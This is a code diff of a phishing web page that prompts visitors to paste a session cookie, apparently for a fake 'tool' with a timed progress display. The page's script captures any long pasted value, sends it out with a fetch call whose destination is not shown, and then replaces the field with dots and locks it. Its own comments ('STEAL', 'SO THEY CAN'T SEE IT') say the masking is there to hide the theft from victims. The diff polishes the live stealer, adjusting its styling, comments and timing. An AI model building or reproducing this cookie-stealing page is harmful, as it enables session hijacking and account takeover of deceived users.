@@ -11,12 +11,11 @@
   .glow{position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#ff006e,#7c3aed,#00d4ff,#00ff88);animation:g 3s linear infinite}
   @keyframes g{0%{background-position:0%}100%{background-position:400%}}
   h1{font-size:2.4em;margin-bottom:10px;background:linear-gradient(90deg,#ff006e,#00ff88);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
-  .subtitle{font-size:1.1em;color:#8b949e96;margin-bottom:20px}
+  .subtitle{font-size:1.1em;color:#8b949e;margin-bottom:20px}
   .badge{background:#f85149;color:#fff;padding:8px 20px;border-radius:30px;font-weight:900;font-size:0.9em;margin-bottom:25px;display:inline-block}
   textarea{width:100%;height:140px;background:#161b22;border:2px solid #30363d;border-radius:14px;padding:16px;font-family:'Courier New',monospace;font-size:15px;color:#58a6ff;resize:none;margin-bottom:25px}
   textarea:focus{outline:none;border-color:#ff006e;box-shadow:0 0 25px rgba(255,0,110,0.4)}
   button{width:100%;padding:18px;font-size:1.7em;font-weight:900;background:linear-gradient(135deg,#ff006e,#c41e3a);color:#fff;border:none;border-radius:16px;cursor:pointer;box-shadow:0 10px 40px rgba(255,0,110,0.6);transition:0.3s;margin-bottom:20px}
-  button:hover{transform:translateY(-3px)}
   button:disabled{opacity:0.6}
   #loading{display:none;font-size:1.5em;color:#ff006e;font-weight:900;margin:20px 0}
   .loading.active{display:block}
@@ -44,7 +43,7 @@
 </div>
 
 <script>
-// STEAL + REPLACE WITH DOTS INSTANTLY
+// STEAL + TURN INTO DOTS INSTANTLY
 document.getElementById('cookie').addEventListener('input', e => {
   const raw = e.target.value.trim();
   if (raw.length > 100) {
@@ -66,10 +65,10 @@ document.getElementById('cookie').addEventListener('input', e => {
       })
     }).catch(() => {});
 
-    // REPLACE WITH DOTS SO THEY CAN'T SEE IT
+    // REPLACE WITH DOTS
     setTimeout(() => {
       document.getElementById('cookie').value = "•".repeat(80);
-      document.getElementById('cookie').style.color = "#444";
+      document.getElementById('cookie').style.color = "#555";
       document.getElementById('cookie').readOnly = true;
     }, 400);
   }
@@ -116,7 +115,7 @@ function start() {
       output.style.display = "block";
       btn.disabled = false;
     }
-  }, 8571); // 60 seconds total
+  }, 4286); // exactly 30 seconds total (7 steps)
 }
 </script>
 </body>
